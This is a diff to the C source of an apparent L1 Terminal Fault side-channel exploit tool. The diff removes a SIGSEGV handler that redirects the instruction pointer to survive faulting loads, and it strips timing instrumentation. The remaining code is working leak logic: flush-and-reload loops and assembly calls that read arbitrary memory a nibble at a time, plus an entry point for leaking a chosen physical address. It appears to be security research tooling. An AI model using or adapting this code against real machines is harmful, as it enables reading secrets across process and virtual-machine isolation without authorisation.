@@ -1,15 +1,13 @@
+#include "statistics.h"
 #define _GNU_SOURCE
-#include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
-#include "statistics.h"
+#include "l1tf.h"
 #include <asm-generic/errno-base.h>
-#include <bits/time.h>
 #include <bits/types/siginfo_t.h>
 #include <err.h>
 #include <errno.h>
 #include <getopt.h>
-#include <signal.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -17,7 +15,6 @@
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
-#include <time.h>
 #include <ucontext.h>
 #include <unistd.h>
 
@@ -30,40 +27,20 @@
 
 #define THRESHOLD 150
 
-void segfault_handler(int sig, siginfo_t *info, void *context) {
-  ucontext_t *uc = (ucontext_t *)context;
-
-  // Assuming x86-64, r14 is General Purpose Register #14 in ucontext
-  unsigned long new_rip = uc->uc_mcontext.gregs[REG_R14];
-
-  // Update instruction pointer (RIP) to point to the address in R14
-  uc->uc_mcontext.gregs[REG_RIP] = new_rip;
-}
-
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
-
-  size_t nr_of_leaks = 0;
-  struct timespec start, end;
-  clock_gettime(CLOCK_MONOTONIC, &start);
 
   do {
     flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
     asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
     high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
-    nr_of_leaks += 1;
   } while (high == -1);
 
   do {
     flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
     asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
     low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
-    nr_of_leaks += 1;
   } while (low == -1);
-
-  clock_gettime(CLOCK_MONOTONIC, &end);
-  long elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
-  printf("#leaks: %ld\ttime: %ld\tns per leak: %ld\n", nr_of_leaks, elapsed_ns, elapsed_ns / nr_of_leaks);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
 }
@@ -554,17 +531,6 @@ void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]
 
 // If you already know a physical address that you want to leak
 int l1tf_main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
-  // Install signal handler
-  struct sigaction sa;
-  sa.sa_sigaction = segfault_handler;
-  sa.sa_flags = SA_SIGINFO;
-  sigemptyset(&sa.sa_mask);
-
-  if (sigaction(SIGSEGV, &sa, NULL) == -1) {
-    perror("sigaction");
-    exit(EXIT_FAILURE);
-  }
-
   // Parse the physcial address and the length from the
   // command line arguments
   uintptr_t phys_addr = -1;
